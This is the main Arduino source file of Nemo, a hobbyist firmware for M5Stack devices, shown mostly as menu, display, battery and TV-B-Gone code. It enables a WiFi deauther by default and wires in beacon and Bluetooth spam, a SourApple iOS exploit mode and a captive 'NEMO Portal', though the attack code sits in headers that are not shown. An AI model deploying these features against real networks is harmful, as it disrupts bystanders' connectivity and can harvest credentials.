// Nemo Firmware for the M5 Stack Stick C Plus
// github.com/n0xa | IG: @4x0nn

// -=-=-=-=-=-=- Uncomment the platform you're building for -=-=-=-=-=-=-
// #define STICK_C_PLUS
// #define STICK_C_PLUS2
// #define STICK_C
// #define CARDPUTER
// -=-=- Uncommenting more than one at a time will result in errors -=-=-

// -=-=- NEMO Language for Menu and Portal -=- Thanks, @marivaaldo and @Mmatuda! -=-=-
// #define LANGUAGE_EN_US
// #define LANGUAGE_PT_BR
// #define LANGUAGE_IT_IT
// #define LANGUAGE_FR_FR

// -- DEPRECATED - THESE ARE NOW EEPROM DEFINED -- //
uint16_t BGCOLOR=0x0001; // placeholder
uint16_t FGCOLOR=0xFFF1; // placeholder

#ifndef NEMO_VERSION
  #define NEMO_VERSION "dev"
#endif

#if !defined(CARDPUTER) && !defined(STICK_C_PLUS2) && !defined(STICK_C_PLUS) && !defined(STICK_C)
  #define CARDPUTER
#endif

#if !defined(LANGUAGE_EN_US) && !defined(LANGUAGE_PT_BR) && !defined(LANGUAGE_IT_IT) && !defined(LANGUAGE_FR_FR)
  #define LANGUAGE_EN_US
#endif

// -=-=- DEAUTHER -=-  @bmorcelli -=-=- | Discord: Pirata#5263 bmorcelli
#define DEAUTHER  //Need to make some changes in arduino IDE, refer to https://github.com/bmorcelli/m5stickC_Plus2-nemo/tree/main/DEAUTH%20Prerequisites


#if defined(STICK_C_PLUS)
  #include <M5StickCPlus.h>
  // -=-=- Display -=-=-
  String platformName="StickC+";
  #define BIG_TEXT 4
  #define MEDIUM_TEXT 3
  #define SMALL_TEXT 2
  #define TINY_TEXT 1
  // -=-=- FEATURES -=-=-
  #define M5LED 10
  #define RTC
  #define AXP
  #define ACTIVE_LOW_IR
  #define ROTATION
  #define USE_EEPROM
  //#define SDCARD   //Requires a custom-built adapter
  //#define SONG

  // -=-=- ALIASES -=-=-
  #define DISP M5.Lcd
  #define IRLED 9
  #define SPEAKER M5.Beep
//  #define BITMAP M5.Lcd.drawBitmap(0, 0, 320, 240, NEMOMatrix) // This doesn't work, generates static.
  #define BITMAP Serial.println("unsupported")
  #define SD_CLK_PIN 0
  #define SD_MISO_PIN 36
  #define SD_MOSI_PIN 26
  #define SD_CS_PIN -1 //can be 14, to avoid serial messages
  #define M5LED_ON LOW
  #define M5LED_OFF HIGH
#endif

#if defined(STICK_C_PLUS2)
  #include <M5StickCPlus2.h>
  // -=-=- Display -=-=-
  String platformName="StickC+2";
  #define BIG_TEXT 4
  #define MEDIUM_TEXT 3
  #define SMALL_TEXT 2
  #define TINY_TEXT 1
  // -=-=- FEATURES -=-=-
  #define ACTIVE_LOW_IR
  #define M5LED 19
  #define ROTATION
  #define USE_EEPROM
  #define RTC      //TODO: plus2 has a BM8563 RTC but the class isn't the same, needs work.
  #define SDCARD   //Requires a custom-built adapter
  #define PWRMGMT
  #define SPEAKER M5.Speaker
  //#define SONG
  // -=-=- ALIASES -=-=-
  #define DISP M5.Lcd
  #define IRLED 19
  #define BITMAP M5.Lcd.drawBmp(NEMOMatrix, 97338)
  #define M5_BUTTON_MENU 35
  #define M5_BUTTON_HOME 37
  #define M5_BUTTON_RST 39
  #define BACKLIGHT 27
  #define MINBRIGHT 190
  #define SD_CLK_PIN 0
  #define SD_MISO_PIN 36
  #define SD_MOSI_PIN 26
  #define SD_CS_PIN 14 //can be -1, but sends a lot of messages of error in serial monitor
  #define M5LED_ON HIGH
  #define M5LED_OFF LOW
#endif

#if defined(STICK_C)
  #include <M5StickC.h>
  // -=-=- Display -=-=-
  String platformName="StickC";
  #define BIG_TEXT 2
  #define MEDIUM_TEXT 2
  #define SMALL_TEXT 1
  #define TINY_TEXT 1
  // -=-=- FEATURES -=-=-
  #define M5LED 10
  #define RTC
  #define AXP
  #define ROTATION
  #define USE_EEPROM
  #define SDCARD   //Requires a custom-built adapter
  //#define SONG
  // -=-=- ALIASES -=-=-
  #define DISP M5.Lcd
  #define IRLED 9
  #define BITMAP Serial.println("unsupported")
  #define SD_CLK_PIN 0
  #define SD_MISO_PIN 36
  #define SD_MOSI_PIN 26
  #define SD_CS_PIN -1 //can be 14, to avoid serial messages
  #define M5LED_ON LOW
  #define M5LED_OFF HIGH
#endif

#if defined(CARDPUTER)
  #include <M5Cardputer.h>
  // -=-=- Display -=-=-
  String platformName="Cardputer";
  #define BIG_TEXT 4
  #define MEDIUM_TEXT 3
  #define SMALL_TEXT 2
  #define TINY_TEXT 1
  // -=-=- FEATURES -=-=-
  #define KB
  #define HID
  #define ACTIVE_LOW_IR
  #define USE_EEPROM
  #define SDCARD
  //#define SONG
  // -=-=- ALIASES -=-=-
  #define DISP M5Cardputer.Display
  #define IRLED 44
  #define BACKLIGHT 38
  #define MINBRIGHT 165
  #define SPEAKER M5Cardputer.Speaker
  #define BITMAP M5Cardputer.Display.drawBmp(NEMOMatrix, 97338)
  #define SD_CLK_PIN 40
  #define SD_MISO_PIN 39
  #define SD_MOSI_PIN 14
  #define SD_CS_PIN 12
  #define VBAT_PIN 10
  #define M5LED_ON LOW
  #define M5LED_OFF HIGH
#endif

// -=-=-=-=-=- LIST OF CURRENTLY DEFINED FEATURES -=-=-=-=-=-
// M5LED      - A visible LED (Red) exposed on this pin number
// IRLED      - An IR LED exposed on this pin number
// RTC        - Real-time clock exposed as M5.Rtc 
// AXP        - AXP192 Power Management exposed as M5.Axp
// PWRMGMT    - StickC+2 Power Management exposed as M5.Power
// KB         - Keyboard exposed as M5Cardputer.Keyboard
// HID        - HID exposed as USBHIDKeyboard
// USE_EEPROM - Store settings in EEPROM
// ROTATION   - Allow screen to be rotated
// DISP       - Set to the API's Display class
// SDCARD     - Device has an SD Card Reader attached
// SONG       - Play melody or beep on startup
// SPEAKER    - Aliased to the prefix used for making noise
// BACKLIGHT  - Alias to the pin used for the backlight on some models
// MINBRIGHT  - The lowest number (0-255) for the backlight to show through

/// SWITCHER ///
// Proc codes
// 0  - Clock
// 1  - Main Menu
// 2  - Settings Menu
// 3  - Clock set
// 4  - Dimmer Time adjustment
// 5  - TV B-GONE
// 6  - Battery info
// 7  - screen rotation
// 8  - AppleJuice Menu
// 9  - AppleJuice Advertisement
// 10 - Credits
// 11 - Wifi beacon spam
// 12 - Wifi tools menu
// 13 - TV-B-Gone Region Setting
// 14 - Wifi scanning
// 15 - Wifi scan results
// 16 - Bluetooth Spam Menu
// 17 - Bluetooth Maelstrom
// 18 - QR Codes
// 19 - NEMO Portal
// 20 - Attack menu
// 21 - Deauth Attack
// 22 - Custom Color Settings
// 23 - Pre-defined color themes
// .. - ..
// 97 - Mount/UnMount SD Card on M5Stick devices, if SDCARD is declared

const String contributors[] PROGMEM = {
  "@bicurico",
  "@bmorcelli",
  "@chr0m1ng",
  "@doflamingozk",
  "@9Ri7",
  "@gustavocelani",
  "@imxnoobx",
  "@klamath1977",
  "@marivaaldo",
  "@mmatuda",
  "@n0xa",
  "@niximkk",
  "@unagironin",
  "@vladimirpetrov",
  "@vs4vijay"
};

int advtime = 0;
int cursor = 0;
int wifict = 0;
int brightness = 100;
int ajDelay = 1000;
int apSsidOffset = 16;
int apSsidMaxLen = 32;
int ph_alert_ssids = 5;
bool rstOverride = false;   // Reset Button Override. Set to true when navigating menus.
bool sourApple = false;     // Internal flag to place AppleJuice into SourApple iOS17 Exploit Mode
bool swiftPair = false;     // Internal flag to place AppleJuice into Swift Pair random packet Mode
bool androidPair = false;   // Internal flag to place AppleJuice into Android Pair random packet Mode
bool maelstrom = false;     // Internal flag to place AppleJuice into Bluetooth Maelstrom mode
bool portal_active = false; // Internal flag used to ensure NEMO Portal exits cleanly
bool activeQR = false; 
const byte PortalTickTimer = 1000;
String apSsidName = String("");
bool isSwitching = true;
#if defined(RTC)
  int current_proc = 0; // Start in Clock Mode
#else
  int current_proc = 1; // Start in Main Menu mode if no RTC
#endif
// DEAUTH vars
uint8_t channel;
String apMac = String("");
bool target_deauth_flg = false;
bool target_deauth = false;
int deauth_tick = 0;        // used to delay the deauth packets when combined to Nemo Portal
bool clone_flg = false;
// DEAUTH end
float bh_max_rssi = -40;
int bh_pkts = 0;
float dh_max_rssi = -20;
int dh_pkts = 0;


#if defined(USE_EEPROM)
  #include <EEPROM.h>
  #define EEPROM_SIZE 64
#endif
#include <IRremote.h>
#include <DNSServer.h>
#include <WebServer.h>
#include "applejuice.h"
#include "WORLD_IR_CODES.h"
#include "wifispam.h"
#include "sd.h"
#include "portal.h"
#include "NEMOMatrix.h"
#include "songs.h"
#include "localization.h"
#include <BLEUtils.h>
#include <BLEServer.h>
#if defined(DEAUTHER)
  #include "deauth.h"                                                               //DEAUTH
  #include "esp_wifi.h"                                                             //DEAUTH
  wifi_ap_record_t ap_record;                                                       //DEAUTH
#endif

#include "deauth_hunter.h"                                                          //DEAUTH HUNTER
#include "ble_hunter.h"                                                             //BLE HUNTER
#include "pineap_hunter.h"                                                         //PINEAP HUNTER
struct MENU {
  char name[19];
  int command;
};


struct QRCODE {
  char name[19];
  String url;
};

QRCODE qrcodes[] = {
  { TXT_BACK, "" },
  { "Rickroll", "https://youtu.be/dQw4w9WgXcQ"},
  { "HackerTyper", "https://hackertyper.net/"},
  { "ZomboCom", "https://html5zombo.com/"},
};


void drawmenu(MENU thismenu[], int size) {
  DISP.setTextSize(SMALL_TEXT);
  DISP.fillScreen(BGCOLOR);
  DISP.setCursor(0, 0, 1);
  // scrolling menu
  if (cursor < 0) {
    cursor = size - 1;  // rollover hack for up-arrow on cardputer  
  }
  if (cursor > 5) {
    for ( int i = 0 + (cursor - 5) ; i < size ; i++ ) {
      if(cursor == i){
        DISP.setTextColor(BGCOLOR, FGCOLOR);
      }
      DISP.printf(" %-19s\n",thismenu[i].name);
      DISP.setTextColor(FGCOLOR, BGCOLOR);
    }
  } else {
    for (
      int i = 0 ; i < size ; i++ ) {
      if(cursor == i){
        DISP.setTextColor(BGCOLOR, FGCOLOR);
      }
      DISP.printf(" %-19s\n",thismenu[i].name);
      DISP.setTextColor(FGCOLOR, BGCOLOR);
    }
  }
}

void number_drawmenu(int nums) {
  DISP.setTextSize(SMALL_TEXT);
  DISP.fillScreen(BGCOLOR);
  DISP.setCursor(0, 0);
  // scrolling menu
  if (cursor > 5) {
    for ( int i = 0 + (cursor - 5) ; i < nums ; i++ ) {
      if(cursor == i){
        DISP.setTextColor(BGCOLOR, FGCOLOR);
      }
      DISP.printf(" %-19d\n",i);
      DISP.setTextColor(FGCOLOR, BGCOLOR);
    }
  } else {
    for (
      int i = 0 ; i < nums ; i++ ) {
      if(cursor == i){
        DISP.setTextColor(BGCOLOR, FGCOLOR);
      }
      DISP.printf(" %-19d\n",i);
      DISP.setTextColor(FGCOLOR, BGCOLOR);
    }
  }
}

void switcher_button_proc() {
  if (rstOverride == false && !isSwitching) {
    if (check_next_press()) {
      isSwitching = true;
      current_proc = 1;
    }
  }
}

// Tap the power button from pretty much anywhere to get to the main menu
void check_menu_press() {
#if defined(AXP)
  if (M5.Axp.GetBtnPress()) {
#endif
#if defined(KB)
  if (M5Cardputer.Keyboard.isKeyPressed(',') || M5Cardputer.Keyboard.isKeyPressed('`')){
#endif
#if defined(M5_BUTTON_MENU)
  if (digitalRead(M5_BUTTON_MENU) == LOW){
#endif
    dimtimer();
    if(portal_active){
      // just in case we escape the portal with the main menu button
      shutdownWebServer();
      portal_active = false;
    }
    isSwitching = true;
    rstOverride = false;
    current_proc = 1;
    delay(100);
  }
}

bool check_next_press(){
#if defined(KB)
  M5Cardputer.update();
  if (M5Cardputer.Keyboard.isKeyPressed(';')){
    // hack to handle the up arrow
    cursor = cursor - 2;
    dimtimer();
    return true;
  }
  //M5Cardputer.update();
  if (M5Cardputer.Keyboard.isKeyPressed(KEY_TAB) || M5Cardputer.Keyboard.isKeyPressed('.')){
    dimtimer();
    return true;
  }
#else
  if (digitalRead(M5_BUTTON_RST) == LOW){
    dimtimer();
    return true;
  }
#endif
  return false;
}

bool check_select_press(){
#if defined(KB)
  M5Cardputer.update();
  if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) || M5Cardputer.Keyboard.isKeyPressed('/')){
    dimtimer();
    return true;
  }
#else
  if (digitalRead(M5_BUTTON_HOME) == LOW){
    dimtimer();
    return true;
  }
#endif
  return false;
}

// Unified Menu Controller
class MenuController {
private:
  MENU* currentMenu;
  int menuSize;
  void (*onExit)();
  void (*onSelect)();
  
public:
  void setup(MENU* menu, int size, void (*exitCallback)() = nullptr, void (*selectCallback)() = nullptr) {
    currentMenu = menu;
    menuSize = size;
    onExit = exitCallback;
    onSelect = selectCallback;
    cursor = 0;
    rstOverride = true;  // Always disable switcher when menu is active
    drawmenu(currentMenu, menuSize);
    delay(500); // Prevent switching after menu loads up
  }
  
  // Special setup with initial screen display
  void setupWithIntro(MENU* menu, int size, String introText, int introDelay = 1000) {
    DISP.fillScreen(BGCOLOR);
    DISP.setCursor(0, 0);
    DISP.println(introText);
    delay(introDelay);
    setup(menu, size);
  }
  
  void loop() {
    if (check_next_press()) {
      cursor++;
      cursor = cursor % menuSize;
      drawmenu(currentMenu, menuSize);
      delay(250);
    }
    if (check_select_press()) {
      if (onSelect) {
        onSelect(); // Custom selection handler
        // Custom callbacks may set rstOverride=false to exit, but if still in menu, restore it
        if (!isSwitching) {
          rstOverride = true;
        }
      } else {
        // Default selection behavior - always allow exit
        rstOverride = false;
        if (onExit) {
          onExit();
        }
        isSwitching = true;
        current_proc = currentMenu[cursor].command;
      }
    }
  }
  
  // Special loop for number menus
  void numberLoop(int maxNum) {
    if (check_next_press()) {
      cursor++;
      cursor = cursor % maxNum;
      number_drawmenu(maxNum);
      delay(250);
    }
    if (check_select_press()) {
      rstOverride = false;
      isSwitching = true;
      current_proc = 1; // Usually goes back to main menu
    }
  }
};

// Global menu controller instance
MenuController menuController;

/// MAIN MENU ///
MENU mmenu[] = {
#if defined(RTC)
  { TXT_CLOCK, 0},
#endif
  { "TV-B-Gone", 13}, // We jump to the region menu first
  { "Bluetooth", 16},
  { "WiFi", 12},
  { "QR Codes", 18},
  { TXT_SETTINGS, 2},
};
int mmenu_size = sizeof(mmenu) / sizeof(MENU);

void mmenu_setup() {
  menuController.setup(mmenu, mmenu_size);
}

bool screen_dim_dimmed = false;
int screen_dim_time = 30;
int screen_dim_current = 0;

void screenBrightness(int bright){
  Serial.printf("Brightness: %d\n", bright);
  #if defined(AXP)
    M5.Axp.ScreenBreath(10 + round(((100 - 10) * bright / 100)));
  #endif
  #if defined(BACKLIGHT)
    int bl = MINBRIGHT + round(((255 - MINBRIGHT) * bright / 100)); 
    analogWrite(BACKLIGHT, bl);
  #endif
}

int uptime(){
  return(int(millis() / 1000));
}

void dimtimer(){
  if(screen_dim_dimmed){
    screenBrightness(brightness);
    screen_dim_dimmed = false;
  }
  screen_dim_current = uptime() + screen_dim_time + 2;
}

void screen_dim_proc() {
  if(screen_dim_time > 0){
    if (screen_dim_dimmed == false) {
      if (uptime() == screen_dim_current || (uptime() + 1) == screen_dim_current || (uptime() + 2) == screen_dim_current) {
        screenBrightness(0);
        screen_dim_dimmed = true;
      }
    }
  }
}

/// Dimmer MENU ///
MENU dmenu[] = {
  { TXT_BACK, screen_dim_time},
  { TXT_NEVER, 0},
  { ("5 " TXT_SEC), 5},
  { ("10 " TXT_SEC), 10},
  { ("15 " TXT_SEC), 15},
  { ("30 " TXT_SEC), 30},
  { ("60 " TXT_SEC), 60},
  { ("120 " TXT_MIN), 120},
  { ("240 " TXT_MIN), 240},
};
int dmenu_size = sizeof(dmenu) / sizeof(MENU);

// Custom callback for dmenu selection
void dmenu_onSelect() {
  screen_dim_time = dmenu[cursor].command;
  #if defined(USE_EEPROM)
    EEPROM.write(1, screen_dim_time);
    EEPROM.commit();
  #endif
  DISP.fillScreen(BGCOLOR);
  DISP.setCursor(0, 0);
  DISP.println(String(TXT_SET_BRIGHT));
  delay(1000);
  cursor = brightness / 10;
  number_drawmenu(11);
  while( !check_select_press()) {
    if (check_next_press()) {
      cursor++;
      cursor = cursor % 11 ;
      number_drawmenu(11);
      screenBrightness(10 * cursor);
      delay(250);
     }
  }
  screenBrightness(10 * cursor);
  brightness = 10 * cursor;
  #if defined(USE_EEPROM)
    EEPROM.write(2, brightness);
    EEPROM.commit();
  #endif
  rstOverride = false;
  isSwitching = true;
  current_proc = 2;
}

void dmenu_setup() {
  DISP.fillScreen(BGCOLOR);
  DISP.setCursor(0, 0);
  DISP.println(String(TXT_AUTO_DIM));
  delay(1000);
  menuController.setup(dmenu, dmenu_size, nullptr, dmenu_onSelect);
}

/// SETTINGS MENU ///
MENU smenu[] = {
  { TXT_BACK, 1},
#if defined(AXP) || defined(PWRMGMT)
  { TXT_BATT_INFO, 6},
#endif
#if defined(CARDPUTER)
  { TXT_BATT_INFO, 6},
#endif
  { TXT_BRIGHT, 4},
#if defined(RTC)
  { TXT_SET_CLOCK, 3},
#endif
#if defined(ROTATION)
  { TXT_ROTATION, 7},
#endif
#if defined(SDCARD)
  #ifndef CARDPUTER
    { TXT_SDCARD, 97},
  #endif
#endif
  { "BH RSSI", 29},
  { "DH RSSI", 30},
  { "BH Alert Pkts", 31},
  { "DH Alert Pkts", 32},
  { TXT_PH_ALERT_SSIDS, 33},
  { TXT_THEME, 23},
  { TXT_ABOUT, 10},
  { TXT_REBOOT, 98},
#if defined(USE_EEPROM)
  { TXT_CLR_SETTINGS, 99},
#endif
};

int smenu_size = sizeof(smenu) / sizeof (MENU);

// Custom callback for smenu selection
void smenu_onSelect() {
  if(smenu[cursor].command == 98){
    rstOverride = false;
    ESP.restart();
  }
  else if(smenu[cursor].command == 99){
    rstOverride = false;
    clearSettings();
  }
  else {
    // Normal menu navigation - don't disable rstOverride
    rstOverride = false;
    isSwitching = true;
    current_proc = smenu[cursor].command;
  }
}

void smenu_setup() {
  menuController.setup(smenu, smenu_size, nullptr, smenu_onSelect);
}

void clearSettings(){
  #if defined(USE_EEPROM)
  for(int i = 0; i < EEPROM_SIZE; i++) {
    EEPROM.write(i, 255);
    Serial.printf("clearing byte %d\n", i);
  }
  EEPROM.commit();
  #endif
  screenBrightness(100);
  DISP.fillScreen(BLUE);
  DISP.setTextSize(BIG_TEXT);
  DISP.setRotation(1);
  DISP.setTextColor(BLUE, WHITE);
  DISP.setCursor(40, 0);
  DISP.println("M5-NEMO");
  DISP.setTextColor(WHITE, BLUE);
  DISP.setTextSize(SMALL_TEXT);
  DISP.println(TXT_CLRING_SETTINGS);
  delay(5000);
  ESP.restart();
}

MENU cmenu[] = {
  { TXT_BACK, 0},
  { TXT_BLACK, 1},
  { TXT_NAVY, 2},
  { TXT_DARKGREEN, 3},
  { TXT_DARKCYAN, 4},
  { TXT_MAROON, 5},
  { TXT_PURPLE, 6},
  { TXT_OLIVE, 7},
  { TXT_LIGHTGREY, 8},
  { TXT_DARKGREY, 9},
  { TXT_BLUE, 10},
  { TXT_GREEN, 11},
  { TXT_CYAN, 12},
  { TXT_RED, 13},
  { TXT_MAGENTA, 14},
  { TXT_YELLOW, 15},
  { TXT_WHITE, 16},
  { TXT_ORANGE, 17},
  { TXT_GREENYELLOW, 18},
  { TXT_PINK, 19},
};
int cmenu_size = sizeof(cmenu) / sizeof (MENU);

void setcolor(bool fg, int col){
  uint16_t color = 0x0000;
  switch (col){
    case 1:
      color=0x0000;
      break; 
    case 2:
      color=0x000F;
      break;
    case 3:
      color=0x03E0;
      break;
    case 4:
      color=0x03EF;
      break;
    case 5:
      color=0x7800;
      break;
    case 6:
      color=0x780F;
      break;
    case 7:
      color=0x7BE0;
      break;
    case 8:
      color=0xC618;
      break;
    case 9:
      color=0x7BEF;
      break;
    case 10:
      color=0x001F;
      break;
    case 11:
      color=0x07E0;
      break;
    case 12:
      color=0x07FF;
      break;
    case 13:
      color=0xF800;
      break;
    case 14:
      color=0xF81F;
      break;
    case 15:
      color=0xFFE0;
      break;
    case 16:
      color=0xFFFF;
      break;
    case 17:
      color=0xFDA0;
      break;
    case 18:
      color=0xB7E0;
      break;
    case 19:
      color=0xFC9F;
      break;
  }
  if(fg){
    FGCOLOR=color;
  }else{
    BGCOLOR=color;
  }
  if(FGCOLOR == BGCOLOR){
    BGCOLOR = FGCOLOR ^ 0xFFFF;
  }
  DISP.setTextColor(FGCOLOR, BGCOLOR);
}

void color_setup() {
  DISP.fillScreen(BGCOLOR);
  DISP.setCursor(0, 0);
  DISP.println(String(TXT_SET_FGCOLOR));
  cursor = 0;
  #if defined(USE_EEPROM)
    cursor=EEPROM.read(4); // get current fg color
  #endif
  rstOverride = true;
  delay(1000);  
  drawmenu(cmenu, cmenu_size);
}

void color_loop() {
  if (check_next_press()) {
    setcolor(EEPROM.read(5), false);
    cursor++;
    cursor = cursor % cmenu_size;
    setcolor(true, cursor);
    drawmenu(cmenu, cmenu_size);
    delay(250);
  }
  if (check_select_press()) {
    #if defined(USE_EEPROM)
      Serial.printf("EEPROM WRITE (4) FGCOLOR: %d\n", cursor);
      EEPROM.write(4, cursor);
      EEPROM.commit();
      cursor=EEPROM.read(5); // get current bg color
    #endif
    DISP.fillScreen(BGCOLOR);
    DISP.setCursor(0, 0);
    DISP.println(String(TXT_SET_BGCOLOR));
    delay(1000);
    setcolor(false, cursor);
    drawmenu(cmenu, cmenu_size);
    while( !check_select_press()) {
      if (check_next_press()) {
        cursor++;
        cursor = cursor % cmenu_size ;
        setcolor(false, cursor);
        drawmenu(cmenu, cmenu_size);
        delay(250);
       }
    }
    #if defined(USE_EEPROM)
      Serial.printf("EEPROM WRITE (5) BGCOLOR: %d\n", cursor);
      EEPROM.write(5, cursor);
      EEPROM.commit();
    #endif
    rstOverride = false;
    isSwitching = true;
    current_proc = 2;
  }
}

MENU thmenu[] = {
  { TXT_BACK, 0},
  { "Nemo", 1},
  { "Tux", 2},
  { "Bill", 3},
  { "Steve", 4},
  { "Lilac", 5},
  { "Contrast", 6},
  { "NightShift", 7},
  { "Camo", 8},
  { "BubbleGum", 9},
  { TXT_COLOR, 99},
};
int thmenu_size = sizeof(thmenu) / sizeof (MENU);

void theme_setup() {
  DISP.fillScreen(BGCOLOR);
  DISP.setCursor(0, 0);
  DISP.println(String(TXT_THEME));
  cursor = 0;
  rstOverride = true;
  delay(1000);  
  drawmenu(thmenu, thmenu_size);
}

int BG=0;
int FG=0;

void theme_loop() {
  if (check_next_press()) {
    cursor++;
    cursor = cursor % thmenu_size;
    switch (thmenu[cursor].command){
      case 0:
        FG=11;
        BG=1;
        break;       
      case 1: // Nemo
        FG=11;
        BG=1;
        break;
      case 2: // Tux
        FG=8;
        BG=1;
        break;  
      case 3: // Bill
        FG=16;
        BG=10;
        break;
      case 4: // Steve
        FG=1;
        BG=8;
        break;        
      case 5: // Lilac
        FG=19;
        BG=6;
        break;
      case 6: // Contrast
        FG=16;
        BG=1;
        break;
      case 7: // NightShift
        FG=5;
        BG=1;
         break;
      case 8: // Camo
        FG=1;
        BG=7;
        break;
      case 9: // BubbleGum
        FG=1;
        BG=19;
        break;
      case 99:
        FG=11;
        BG=1;
        break;
     }
    setcolor(true, FG);
    setcolor(false, BG);
    drawmenu(thmenu, thmenu_size);
    delay(250);
  }
  if (check_select_press()) {
    switch (thmenu[cursor].command){
      case 99:
        rstOverride = false;
        isSwitching = true;
        current_proc = 22;
        break;
      case 0:
        #if defined(USE_EEPROM)
          setcolor(true, EEPROM.read(4));
          setcolor(false, EEPROM.read(5));
        #endif
        rstOverride = false;
        isSwitching = true;
        current_proc = 2;
        break;
      default:
        #if defined(USE_EEPROM)
          Serial.printf("EEPROM WRITE (4) FGCOLOR: %d\n", FG);
          EEPROM.write(4, FG);
          Serial.printf("EEPROM WRITE (5) BGCOLOR: %d\n", BG);
          EEPROM.write(5, BG);
          EEPROM.commit();
        #endif
        rstOverride = false;
        isSwitching = true;
        current_proc = 2;
    }
  }
}

int rotation = 1;
#if defined(ROTATION)
  /// Rotation MENU ///
  MENU rmenu[] = {
    { TXT_BACK, rotation},
    { TXT_RIGHT, 1},
    { TXT_LEFT, 3},
  };
  int rmenu_size = sizeof(rmenu) / sizeof (MENU);

  // Custom callback for rmenu selection
  void rmenu_onSelect() {
    rstOverride = false;
    isSwitching = true;
    rotation = rmenu[cursor].command;
    DISP.setRotation(rotation);
    #if defined(USE_EEPROM)
      EEPROM.write(0, rotation);
      EEPROM.commit();
    #endif
    current_proc = 2;
  }

  void rmenu_setup() {
    menuController.setup(rmenu, rmenu_size, nullptr, rmenu_onSelect);
  }
#endif //ROTATION

/// BATTERY INFO ///

// Get battery color based on percentage
uint16_t getBatteryColor(int battery) {
  if(battery < 20) {
    return RED;
  } else if(battery < 60) {
    return ORANGE;
  } else {
    return GREEN;
  }
}

void battery_drawmenu(int battery, float voltage_b = 0, float voltage_c = 0) {
  DISP.fillScreen(BGCOLOR);
  
  // Get battery bar color
  uint16_t batteryColor = getBatteryColor(battery);
  
#if defined(STICK_C)
  // Smaller battery bar for StickC  
  int barX = 10, barY = 25, barW = 100, barH = 20;
  int textX = 45, textY = 50;
  int exitY = 70;
  int textSize = SMALL_TEXT;
#else
  // Large battery bar for Cardputer and StickC Plus* models (240x135 screen)
  int barX = 10, barY = 20, barW = 220, barH = 40;
  int textX = 100, textY = 70;
  int exitY = 120;
  int textSize = BIG_TEXT;
#endif

  // Draw battery outline
  DISP.drawRect(barX, barY, barW, barH, batteryColor);
  
  // Draw battery fill
  int fillW = (barW - 4) * battery / 100;
  if (fillW > 0) {
    DISP.fillRect(barX + 2, barY + 2, fillW, barH - 4, batteryColor);
  }
  
  // Draw battery terminal (small rectangle on right)
  DISP.drawRect(barX + barW, barY + barH/4, 3, barH/2, batteryColor);
  DISP.fillRect(barX + barW, barY + barH/4, 3, barH/2, batteryColor);
  
  // Draw percentage text
  DISP.setTextColor(FGCOLOR, BGCOLOR);
  DISP.setTextSize(textSize);
  DISP.setCursor(textX, textY, 1);
  DISP.print(battery);
  DISP.println("%");
    
  // Exit instruction
  DISP.setTextSize(TINY_TEXT);
  DISP.setCursor(10, exitY, 1);
  DISP.println(TXT_EXIT);
  DISP.setTextColor(FGCOLOR, BGCOLOR);
}

#if defined(PWRMGMT)
  int old_battery = 0;

  int get_battery_voltage() {
    return M5.Power.getBatteryLevel();
  }

  void battery_setup() {
    int battery = get_battery_voltage();
    battery_drawmenu(battery);
    delay(500); // Prevent switching after menu loads up
  }

  void battery_loop() {
    delay(300);
    int battery = get_battery_voltage();

    if (battery != old_battery){
      battery_drawmenu(battery);
    }
    if (check_select_press()) {
      isSwitching = true;
      current_proc = 1;
    }
    old_battery = battery;
  }
#endif

#ifdef AXP
  int old_battery=0;
  float old_b=0, old_c=0;

  void battery_setup() {
    rstOverride = false;
    float c = M5.Axp.GetVapsData() * 1.4 / 1000;
    float b = M5.Axp.GetVbatData() * 1.1 / 1000;
    int battery = ((b - 3.0) / 1.2) * 100;
    battery_drawmenu(battery, b, c);
    delay(500); // Prevent switching after menu loads up
  }

  void battery_loop() {
    delay(300);
    float c = M5.Axp.GetVapsData() * 1.4 / 1000;
    float b = M5.Axp.GetVbatData() * 1.1 / 1000;
    int battery = ((b - 3.0) / 1.2) * 100;
    if (battery != old_battery || b != old_b || c != old_c){
      battery_drawmenu(battery, b, c);
      old_b = b;
      old_c = c;
    }
    if (check_select_press()) {
      rstOverride = false;
      isSwitching = true;
      current_proc = 1;
    }
    old_battery = battery;
  }
#endif // AXP

#if defined(CARDPUTER)
  uint8_t oldBattery = 0;

  void battery_setup() {
    rstOverride = false;
    pinMode(VBAT_PIN, INPUT);
    uint8_t battery = ((((analogRead(VBAT_PIN)) - 1842) * 100) / 738);
    battery_drawmenu(battery);
    delay(500); // Prevent switching after menu loads up
    /*
      Used minimum 3,0V and maximum 4,2V for battery. So it may show wrong values. Needs testing.
      It only shows decent values when disconnected from charger, due to HW limitations.
      Equation: Bat% = ((Vadc - 1842) / (2580 - 1842)) * 100. Where: 4,2V = 2580, 3,0V = 1842.
    */
  }

  void battery_loop() {
    // Read 30 battery values to calculate the average (avoiding unprecise and close values)
    uint16_t batteryValues = 0;
    for(uint8_t i = 0; i < 30; i++) { // 30 iterations X 100ms = 3 seconds for each refresh
      delay(100);
      batteryValues += ((((analogRead(VBAT_PIN)) - 1842) * 100) / 738);
      M5Cardputer.update();
      if(M5Cardputer.Keyboard.isChange() && M5Cardputer.Keyboard.isPressed()) { // If any key is pressed
        rstOverride = false;
        isSwitching = true;
        current_proc = 1;
        break;
      }
    }

    if(!isSwitching) { // If is not switching, calculate battery average
      uint8_t battery = batteryValues / 30; // Iteration times
      Serial.printf("Battery Level: %d\n", battery);
      if(battery != oldBattery) { // Only draw a new screen if value is different
        oldBattery = battery;
        battery_drawmenu(battery);
      }
    }
  }
#endif // Cardputer

/// TV-B-GONE ///
void tvbgone_setup() {
  DISP.fillScreen(BGCOLOR);
  DISP.setTextSize(BIG_TEXT);
  DISP.setCursor(0, 0);
  DISP.println("TV-B-Gone");
  DISP.setTextSize(SMALL_TEXT);
  IrSender.begin(IRLED); // Initialize IR sender
  // Hack: Set IRLED high to turn it off after setup. Otherwise it stays on (active low)
  digitalWrite(IRLED, M5LED_OFF);

  delay_ten_us(5000);
  if(region == NA) {
    DISP.print(TXT_RG_AMERICAS);
  }
  else {
    DISP.println(TXT_RG_EMEA);
  }
  DISP.println(TXT_SEL_GO_PAUSE);
  DISP.println(TXT_SEL_EXIT);
  delay(1000);
}

void tvbgone_loop()
{
  if (check_select_press()) {
    delay(250);
    Serial.println(TXT_TRIG_TV);
    sendAllCodes();
  }
}

/// TVBG-Region MENU ///
MENU tvbgmenu[] = {
  { TXT_BACK, 3},
  { TXT_MN_AMERICA, 0},
  { TXT_MN_EMEA, 1},
};
int tvbgmenu_size = sizeof(tvbgmenu) / sizeof (MENU);

